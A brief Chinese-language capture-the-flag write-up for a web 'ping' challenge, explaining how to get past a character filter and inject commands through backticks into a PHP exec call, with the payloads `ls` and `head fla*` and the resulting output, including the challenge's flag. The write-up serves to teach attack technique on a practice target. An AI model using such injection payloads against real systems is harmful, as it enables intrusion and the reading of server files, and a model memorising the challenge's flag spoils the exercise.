# inndy web ping
* [題目網址](https://hackme.inndy.tw/ping/)
1. 題目擋掉了一些字串，如果打了那些就會跳出 ... not allowed，而且字數小於 15，要在 exec("ping -c 1 \"{$ip}\" 2>&1", $ret); 這句之中成功 command injection
2. 既然不能用 " 和 ; 來合起雙引號並且打新命令，那只好在裡面直接執行指令。在 linux 指令中，被包在反引號裡面的命令會先被執行完之後，把結果傳出來放在原本的命令中
```
如果輸入 `ls`:
實際上執行的命令: ping -c 1 "`ls`" 2>&1
它會先把 ls 的結果傳回來放在指令中，然後才執行 ping，所以假設 ls 的結果為 file1 file2 file3，那就會變成 ping -c 1 "file1 file2 file3" 2&>1，但是因為沒有這個 IP，所以 ping 不了，但是還是會回傳我們打過的指令

結果回傳了
ping: flag.php
index.php: Name or service not known
```
3. 看來就是 flag.php 了，那要知道裡面的內容，有很多方法，如:cat, strings, head, tail，但是 cat 和 g 都被過濾掉了，所以只能用 head, tail。但是 flag 也被過濾了，所以可以使用萬用字元 *，輸入 fla*，會把開頭為 fla 的全都取出來
```
輸入: `head fla*`
回傳結果: 
ping: <?php
$flag = 'FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}';: Name or service not known
```